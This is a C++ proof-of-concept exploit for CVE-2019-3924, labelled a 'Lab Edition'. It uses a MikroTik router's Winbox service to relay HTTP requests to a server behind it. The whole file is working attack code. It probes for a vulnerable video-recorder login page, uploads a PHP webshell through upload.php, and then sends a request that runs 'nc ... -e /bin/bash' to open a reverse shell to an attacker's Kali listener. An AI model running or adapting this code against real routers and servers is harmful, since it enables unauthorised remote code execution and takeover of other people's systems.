#include <cstdlib>
#include <iostream>
#include <boost/cstdint.hpp>
#include <boost/program_options.hpp>
#include <boost/algorithm/string.hpp>

#include "winbox_session.hpp"
#include "winbox_message.hpp"

namespace
{
    const char s_version[] = "CVE-2019-3924 PoC Lab Edition v1.0";

    bool parseCommandLine(int p_argCount, const char* p_argArray[],
                          std::string& p_router_ip, std::string& p_router_port,
                          std::string& p_victim_ip, std::string& p_victim_port,
                          std::string& p_kali_ip, std::string& p_kali_port,
                          bool& p_detect_only)
    {
        boost::program_options::options_description description("options");
        description.add_options()
            ("help,h", "A list of command line options")
            ("router_port", boost::program_options::value<std::string>()->default_value("8291"), "The MikroTik Winbox port (default: 8291)")
            ("router_ip", boost::program_options::value<std::string>(), "The MikroTik router IP (e.g., 192.168.56.2)")
            ("victim_port", boost::program_options::value<std::string>()->default_value("80"), "The victim web server port (default: 80)")
            ("victim_ip", boost::program_options::value<std::string>(), "The victim server IP (e.g., 192.168.56.3)")
            ("kali_ip", boost::program_options::value<std::string>(), "The Kali attacker IP for reverse shell (e.g., 10.0.2.15)")
            ("kali_port", boost::program_options::value<std::string>()->default_value("4444"), "The port on Kali listening for reverse shell (default: 4444)")
            ("detect_only,d", boost::program_options::bool_switch()->default_value(false), "Exit after detection logic");

        boost::program_options::variables_map argv_map;
        try
        {
            boost::program_options::store(
                boost::program_options::parse_command_line(
                    p_argCount, p_argArray, description), argv_map);
        }
        catch (const std::exception& e)
        {
            std::cerr << e.what() << std::endl;
            std::cerr << description << std::endl;
            return false;
        }

        boost::program_options::notify(argv_map);
        if (argv_map.empty() || argv_map.count("help"))
        {
            std::cerr << description << std::endl;
            return false;
        }

        if (argv_map.count("version"))
        {
            std::cerr << "Version: " << ::s_version << std::endl;
            return false;
        }

        if (argv_map.count("router_ip") && argv_map.count("victim_ip") && 
            argv_map.count("kali_ip"))
        {
            p_router_ip.assign(argv_map["router_ip"].as<std::string>());
            p_router_port.assign(argv_map["router_port"].as<std::string>());
            p_victim_ip.assign(argv_map["victim_ip"].as<std::string>());
            p_victim_port.assign(argv_map["victim_port"].as<std::string>());
            p_kali_ip.assign(argv_map["kali_ip"].as<std::string>());
            p_kali_port.assign(argv_map["kali_port"].as<std::string>());
            p_detect_only = argv_map["detect_only"].as<bool>();
            return true;
        }
        else
        {
            std::cout << "Lab usage example:" << std::endl;
            std::cout << "  ./exploit --router_ip=192.168.56.2 --victim_ip=192.168.56.3 --kali_ip=10.0.2.15" << std::endl;
            std::cout << description << std::endl;
        }

        return false;
    }

    bool find_victim_server(Winbox_Session& session,
                       std::string& p_address, boost::uint32_t p_converted_address,
                       boost::uint32_t p_converted_port)
    {
        WinboxMessage msg;
        msg.set_to(104);
        msg.set_command(1);
        msg.set_request_id(1);
        msg.set_reply_expected(true);
        msg.add_string(7, "GET / HTTP/1.1\r\nHost:" + p_address + "\r\nAccept:*/*\r\n\r\n"); // text to send
        msg.add_string(8, "Network Video Recorder Login</title>"); // text to match
        msg.add_u32(3, p_converted_address); // ip address
        msg.add_u32(4, p_converted_port); // port

        session.send(msg);
        msg.reset();

        if (!session.receive(msg))
        {
            std::cerr << "Error receiving a response." << std::endl;
            return false;
        }

        if (msg.has_error())
        {
            std::cerr << msg.get_error_string() << std::endl;
            return false;
        }

        return msg.get_boolean(0xd);
    }
    
    bool upload_webshell(Winbox_Session& session, boost::uint32_t p_converted_address,
                         boost::uint32_t p_converted_port)
    {
        WinboxMessage msg;
        msg.set_to(104);
        msg.set_command(1);
        msg.set_request_id(1);
        msg.set_reply_expected(true);
        msg.add_string(7, "POST /upload.php HTTP/1.1\r\nHost:a\r\nContent-Type:multipart/form-data;boundary=a\r\nContent-Length:96\r\n\r\n--a\nContent-Disposition:form-data;name=userfile;filename=a.php\n\n<?php system($_GET['a']);?>\n--a\n");
        msg.add_string(8, "200 OK");
        msg.add_u32(3, p_converted_address);
        msg.add_u32(4, p_converted_port);

        session.send(msg);
        msg.reset();

        if (!session.receive(msg))
        {
            std::cerr << "Error receiving a response." << std::endl;
            return false;
        }

        if (msg.has_error())
        {
            std::cerr << msg.get_error_string() << std::endl;
            return false;
        }

        return msg.get_boolean(0xd);
    }

    bool execute_reverse_shell(Winbox_Session& session, boost::uint32_t p_converted_address,
                               boost::uint32_t p_converted_port, std::string& p_reverse_ip,
                               std::string& p_reverse_port)
    {
        WinboxMessage msg;
        msg.set_to(104);
        msg.set_command(1);
        msg.set_request_id(1);
        msg.set_reply_expected(true);
        msg.add_string(7, "GET /a.php?a=(nc%20" + p_reverse_ip + "%20" + p_reverse_port + "%20-e%20/bin/bash)%26 HTTP/1.1\r\nHost:a\r\n\r\n");
        msg.add_string(8, "200 OK");
        msg.add_u32(3, p_converted_address);
        msg.add_u32(4, p_converted_port);

        session.send(msg);
        msg.reset();

        if (!session.receive(msg))
        {
            std::cerr << "Error receiving a response." << std::endl;
            return false;
        }

        if (msg.has_error())
        {
            std::cerr << msg.get_error_string() << std::endl;
            return false;
        }

        return msg.get_boolean(0xd);
    }
}

int main(int p_argc, const char** p_argv)
{
    bool detect_only = false;
    std::string router_ip;
    std::string router_port;
    std::string victim_ip;
    std::string victim_port;
    std::string kali_ip;
    std::string kali_port;
    
    if (!parseCommandLine(p_argc, p_argv, router_ip, router_port, victim_ip,
         victim_port, kali_ip, kali_port, detect_only))
    {
        return EXIT_FAILURE;
    }

    std::cout << "[!] Lab configuration:" << std::endl;
    std::cout << "    MikroTik router: " << router_ip << ":" << router_port << std::endl;
    std::cout << "    Victim server: " << victim_ip << ":" << victim_port << std::endl;
    std::cout << "    Kali listener: " << kali_ip << ":" << kali_port << std::endl;
    
    if (detect_only)
    {
        std::cout << "[!] Running in detection mode only" << std::endl;
    }
    else
    {
        std::cout << "[!] Running in full exploitation mode" << std::endl;
    }

    std::cout << "[+] Connecting to MikroTik router at " << router_ip << ":" << router_port << std::endl;
    Winbox_Session winboxSession(router_ip, router_port);
    if (!winboxSession.connect())
    {
        std::cerr << "[-] Failed to connect to the MikroTik router." << std::endl;
        return EXIT_FAILURE;
    }
    std::cout << "[+] Connected to router!" << std::endl;

    boost::uint32_t converted_address = ntohl(inet_network(victim_ip.c_str()));
    boost::uint16_t converted_port = std::stoi(victim_port);

    std::cout << "[+] Checking for vulnerable service at " << victim_ip << ":" << victim_port << std::endl;
    if (!find_victim_server(winboxSession, victim_ip, converted_address, converted_port))
    {
      std::cerr << "[-] Target does not appear to be vulnerable." << std::endl;
      return EXIT_FAILURE;
    }
    std::cout << "[+] Target appears to be vulnerable!" << std::endl;

    if (detect_only)
    {
        return EXIT_SUCCESS;
    }
    
    std::cout << "[+] Uploading webshell to victim" << std::endl;
    if (!upload_webshell(winboxSession, converted_address, converted_port))
    {
        std::cerr << "[-] Failed to upload the shell." << std::endl;
        return EXIT_FAILURE;
    }

    std::cout << "[+] Before continuing, make sure you have started a listener on Kali:" << std::endl;
    std::cout << "    Run this on Kali: nc -lvnp " << kali_port << std::endl;
    std::cout << "[+] Press Enter to continue...";
    std::cin.get();

    std::cout << "[+] Executing reverse shell to " << kali_ip << ":" << kali_port << std::endl;
    if (!execute_reverse_shell(winboxSession, converted_address, converted_port,
                               kali_ip, kali_port))
    {
        std::cerr << "[-] Failed to execute the reverse shell." << std::endl;
        return EXIT_FAILURE;
    }

    std::cout << "[+] Exploit complete! Check your listener on Kali." << std::endl;
    
    return EXIT_SUCCESS;
}
